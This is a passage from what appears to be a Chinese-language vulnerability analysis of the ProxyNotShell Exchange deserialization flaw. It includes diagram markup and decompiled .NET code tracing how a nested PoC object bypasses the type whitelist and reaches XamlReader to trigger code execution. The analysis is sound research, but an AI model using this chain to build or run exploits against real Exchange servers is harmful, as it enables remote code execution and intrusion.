v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="2.42" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneDeserializedObject</text></g><g id="shape54-192" v:mID="54" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1257.23)"><title>流程.54</title><desc>ReadOneObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="23.69" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneObject</text></g><g id="shape56-195" v:mID="56" v:groupContext="shape" v:layerMember="1" transform="translate(203.746,-483.689)"><title>动态连接线.56</title><path d="M6.06 1360.63 L48.6 1360.63 L48.6 556.14 L14.16 556.14" class="st6"/></g><g id="shape57-200" v:mID="57" v:groupContext="shape" v:layerMember="1" transform="translate(153.208,-1257.23)"><title>动态连接线.57</title><path d="M7.09 1360.63 L7.09 1408.22" class="st6"/></g><g id="shape58-205" v:mID="58" v:groupContext="shape" v:layerMember="1" transform="translate(153.208,-1141.72)"><title>动态连接线.58</title><path d="M7.09 1360.63 L7.09 1420.6" class="st6"/></g><g id="shape59-210" v:mID="59" v:groupContext="shape" v:layerMember="1" transform="translate(160.294,-1257.23)"><title>动态连接线.59</title><desc>调用</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="-90.9685" cy="1790.99" width="40" height="18.4064"/><path d="M0 1360.63 L0 1381.89 L-90.97 1381.89 L-90.97 2274.44 L-59.13 2274.44" class="st6"/><rect v:rectContext="textBkgnd" x="-98.9685" y="1785.79" width="15.9999" height="10.403" class="st8"/><text x="-98.97" y="1793.59" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用</text></g><g id="shape61-217" v:mID="61" v:groupContext="shape" v:layerMember="1" transform="translate(151.688,-312.478)"><title>动态连接线.61</title><path d="M7.09 1360.63 L7.09 1416.47" class="st6"/></g><g id="shape60-222" v:mID="60" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-188.711)"><title>流程.60</title><desc>GetPSStandardMember</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="10.13" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>GetPSStandardMember</text></g><g id="shape63-225" v:mID="63" v:groupContext="shape" v:layerMember="1" transform="translate(151.688,-188.711)"><title>动态连接线.63</title><path d="M7.09 1360.63 L7.09 1408.22" class="st6"/></g><g id="shape62-230" v:mID="62" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-56.6929)"><title>流程.62</title><desc>读取adaptedMembers的TargetTypeForDeserialization并返回</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1321.44" width="103.14" height="78.3858"/><rect x="0" y="1282.24" width="103.139" height="78.3858" class="st2"/><text x="8.33" y="1314.04" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>读取<tspan class="st10" v:langID="1033">adaptedMembers</tspan>的<tspan x="2.55" dy="1.225em" class="st10" v:langID="1033">TargetTypeForDeserializatio</tspan><tspan x="37.31" dy="1.275em" class="st10" v:langID="1033">n</tspan>并返回</text></g><g id="shape66-236" v:mID="66" v:groupContext="shape" v:layerMember="1" transform="translate(160.294,-1257.23)"><title>动态连接线.66</title><desc>调用将外层对象序列化数据</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="147.889" cy="1737.72" width="114.2" height="18.4064"/><path d="M0 1360.63 L0 1381.89 L89.05 1381.89 A3 3 0 0 1 95.05 1381.89 L147.89 1381.89 L147.89 2241.44 L163.11 2241.44" class="st6"/><rect v:rectContext="textBkgnd" x="95.8888" y="1732.52" width="104" height="10.403" class="st8"/><text x="95.89" y="1740.32" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，将外层对象序列化数据</text></g><g id="shape65-243" v:mID="65" v:groupContext="shape" v:layerMember="0" transform="translate(329.443,-345.483)"><title>流程.65</title><desc>LanguagePrimitives.ConvertTo</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="2.54" y="1327.29" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>LanguagePrimitives.Convert<tspan x="47.13" dy="1.2em" class="st5">To</tspan></text></g><g id="shape69-247" v:mID="69" v:groupContext="shape" v:layerMember="1" transform="translate(373.926,-345.483)"><title>动态连接线.69</title><path d="M7.09 1360.63 L7.09 1416.47" class="st6"/></g><g id="shape68-252" v:mID="68" v:groupContext="shape" v:layerMember="0" transform="translate(329.443,-221.716)"><title>流程.68</title><desc>将S标签内数据转换为XamlReader对象触发代码执行</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="13.44" y="1321.89" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>将<tspan class="st10">S</tspan>标签内数据转换为<tspan x="2.4" dy="1.3em" class="st10">XamlReader</tspan>对象，触发代码<tspan x="43.57" dy="1.3em" class="st5">执行</tspan></text></g></g></svg><p>在Exchange中，允许反序列化的类白名单和类反序列化相关信息定义在<code>exchange.partial.types.ps1xml</code>和<code>exchange.types.ps1xml</code>等文件中，Exchange会读取这些文件，在反序列化数据时，会payload里面的目标类和文件里面的白名单类做对比，只有在白名单内的类才允许反序列化。</p><p>PoC由嵌套对象组成，在反序列化嵌套对象时，会先反序列化里层对象，而后反序列化外层对象。在<code>Exchang</code>反序列化PoC的里层对象时，将通过<code>ConvertTo</code>函数转换到目标类，传给<code>ConvertTo</code>的resultType值为<code>System.Exception</code>，<code>System.Exception</code>在<code>exchange.partial.types.ps1xml</code>中定义如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>&lt;Type></span></span><span style="display:flex;"><span> &lt;Name>System.Exception&lt;/Name></span></span><span style="display:flex;"><span> &lt;Members></span></span><span style="display:flex;"><span> &lt;CodeProperty IsHidden=<span style="color:#e6db74">"true"</span>></span></span><span style="display:flex;"><span> &lt;Name>SerializationData&lt;/Name></span></span><span style="display:flex;"><span> &lt;GetCodeReference></span></span><span style="display:flex;"><span> &lt;TypeName>Microsoft.Exchange.Data.SerializationTypeConverter&lt;/TypeName></span></span><span style="display:flex;"><span> &lt;MethodName>GetSerializationData&lt;/MethodName></span></span><span style="display:flex;"><span> &lt;/GetCodeReference></span></span><span style="display:flex;"><span> &lt;/CodeProperty></span></span><span style="display:flex;"><span> &lt;/Members></span></span><span style="display:flex;"><span> &lt;TypeConverter></span></span><span style="display:flex;"><span> &lt;TypeName>Microsoft.Exchange.Data.SerializationTypeConverter&lt;/TypeName></span></span><span style="display:flex;"><span> &lt;/TypeConverter></span></span><span style="display:flex;"><span> &lt;/Type></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">object</span> ConvertTo(<span style="color:#66d9ef">object</span> valueToConvert, Type resultType,<span style="color:#66d9ef">bool</span> recursion, IFormatProvider formatProvider, TypeTable backupTypeTable)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> result;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> (LanguagePrimitives.typeConversion.TraceScope(<span style="color:#e6db74">"Converting \"{0}\" to \"{1}\"."</span>, valueToConvert, resultType))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (resultType ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> PSTraceSource.NewArgumentNullException(<span style="color:#e6db74">"resultType"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> flag;</span></span><span style="display:flex;"><span> result = LanguagePrimitives.FigureConversion(valueToConvert, resultType,<span style="color:#66d9ef">out</span> flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) :<span style="color:#66d9ef">null</span>, formatProvider, backupTypeTable);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>其定义了*<code>&lt;TypeName>Microsoft.Exchange.Data.SerializationTypeConverter&lt;/TypeName></code><em>，Exchange将通过</em><code>Microsoft.Exchange.Data.SerializationTypeConverter</code>*类对里层序列化数据进行反序列化。<code>Microsoft.Exchange.Data.SerializationTypeConverter</code>经过一系列调用，最终由<code>System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize</code>方法进行反序列化。</p><p>在该方法会调用<code>System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Run</code>，这方法会循环读取内存中的里层对象的序列化数据，将其转换为<em>System.UnitySerializationHolder</em>对象。</p><p>之后Exchange会通过<code>Assembly.LoadFrom</code>载入*<code>System.UnitySerializationHolder.m_assemblyName</code><em>所指明的DLL，并且返回</em><code>System.UnitySerializationHolder.m_data</code>*类型的Type对象。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span><span style="color:#66d9ef">object</span> Deserialize(HeaderHandler handler, __BinaryParser serParser,<span style="color:#66d9ef">bool</span> fCheck,<span style="color:#66d9ef">bool</span> isCrossAppDomain, IMethodCallMessage methodCallMessage)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> serParser.Run();</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">this</span>.bMethodCall &amp;&amp; !<span style="color:#66d9ef">this</span>.bMethodReturn)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.TopObject ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SerializationException(Environment.GetResourceString(<span style="color:#e6db74">"Serialization_TopObject"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.HasSurrogate(<span style="color:#66d9ef">this</span>.TopObject.GetType()) &amp;&amp;<span style="color:#66d9ef">this</span>.topId !=<span style="color:#ae81ff">0L</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject =<span style="color:#66d9ef">this</span>.m_objectManager.GetObject(<span style="color:#66d9ef">this</span>.topId);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.TopObject<span style="color:#66d9ef">is</span> IObjectReference)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject = ((IObjectReference)<span style="color:#66d9ef">this</span>.TopObject).GetRealObject(<span style="color:#66d9ef">this</span>.m_context);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.bFullDeserialization)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.m_objectManager.RaiseDeserializationEvent();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (handler !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.handlerObject = handler(<span style="color:#66d9ef">this</span>.headers);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.bMethodCall)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span>[] callA =<span style="color:#66d9ef">this</span>.TopObject<span style="color:#66d9ef">as</span><span style="color:#66d9ef">object</span>[];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject =<span style="color:#66d9ef">this</span>.binaryMethodCall.ReadArray(callA,<span style="color:#66d9ef">this</span>.handlerObject);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.bMethodReturn)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span>[] returnA =<span style="color:#66d9ef">this</span>.TopObject<span style="color:#66d9ef">as</span><span style="color:#66d9ef">object</span>[];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject =<span style="color:#66d9ef">this</span>.binaryMethodReturn.ReadArray(returnA, methodCallMessage,<span style="color:#66d9ef">this</span>.handlerObject);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.TopObject;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/1.png"/></p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/2.png"/></p><p>在一系列函数调用返回后，<em><code>System.Management.Automation.InternalDeserializer.ReadProperties</code><em>会将</em><code>System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize</code><em>返回的对象添加到</em><code>PSObject.adaptedMembers</code><em>中，需要注意的是该对象变量名为</em><code>TargetTypeForDeserialization</code></em>。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span> ReadProperties(PSObject dso)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> dso.isDeserialized =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> dso.adaptedMembers =<span style="color:#66d9ef">new</span> PSMemberInfoInternalCollection&lt;PSPropertyInfo>();</span></span><span style="display:flex;"><span> dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod&lt;PSMemberInfo>(dso,<span style="color:#e6db74">"GetType"</span>));</span></span><span style="display:flex;"><span> PSGetMemberBinder.SetHasInstanceMember(<span style="color:#e6db74">"GetType"</span>);</span></span><span style="display:flex;"><span> dso.clrMembers =<span style="color:#66d9ef">new</span> PSMemberInfoInternalCollection&lt;PSPropertyInfo>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.ReadStartElementAndHandleEmpty(<span style="color:#e6db74">"Props"</span>))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">this</span>._reader.NodeType == XmlNodeType.Element)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">string</span> name =<span style="color:#66d9ef">this</span>.ReadNameAttribute();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> serializedValue =<span style="color:#66d9ef">this</span>.ReadOneObject();</span></span><span style="display:flex;"><span> PSProperty member =<span style="color:#66d9ef">new</span> PSProperty(name, serializedValue);</span></span><span style="display:flex;"><span> dso.adaptedMembers.Add(member);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.ReadEndElement();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>在反序列化外层对象时，<code>ReadOneObject</code>会调用<code>GetTargetTypeForDeserialization</code>获取反序列化的目标类型，并通过<code>ConvertTo</code>转化为该对象。</p><p>在<code>GetTargetTypeForDeserialization</code>函数中，将会调用<code>GetPSStandardMember</code>并传入硬编码的<code>TargetTypeForDeserialization</code>，在<code>GetPSStandardMember</code>中会通过<code>TypeTableGetMemberDelegate</code>创建成员集合，其中包括子类的成员属性，而后匹配其中的<code>memberName</code>项对应的值并返回。此时获取的值为<code>XamlReader</code>类型的Type对象。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span> Type GetTargetTypeForDeserialization(TypeTable backupTypeTable)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PSMemberInfo psstandardMember =<span style="color:#66d9ef">this</span>.GetPSStandardMember(backupTypeTable,<span style="color:#e6db74">"TargetTypeForDeserialization"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (psstandardMember !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> psstandardMember.Value<span style="color:#66d9ef">as</span> Type;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">internal</span> PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable,<span style="color:#66d9ef">string</span> memberName)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PSMemberInfo psmemberInfo =<span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> TypeTable typeTable = (backupTypeTable !=<span style="color:#66d9ef">null</span>) ? backupTypeTable :<span style="color:#66d9ef">this</span>.GetTypeTable();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (typeTable !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate&lt;PSMemberSet>(<span style="color:#66d9ef">this</span>, typeTable,<span style="color:#e6db74">"PSStandardMembers"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (psmemberSet !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> psmemberSet.ReplicateInstance(<span style="color:#66d9ef">this</span>);</span></span><span style="display:flex;"><span> psmemberInfo =<span style="color:#66d9ef">new</span> PSMemberInfoIntegratingCollection&lt;PSMemberInfo>(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (psmemberInfo ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> psmemberInfo = (<span style="color:#66d9ef">this</span>.InstanceMembers[<span style="color:#e6db74">"PSStandardMembers"</span>]<span style="color:#66d9ef">as</span> PSMemberSet);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> psmemberInfo;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>外层类类型定义为<code>System.ServiceProcess.ServiceController</code>，其定义在types.ps1xml文件内，定义如下。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;Type></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>System.ServiceProcess.ServiceController<span 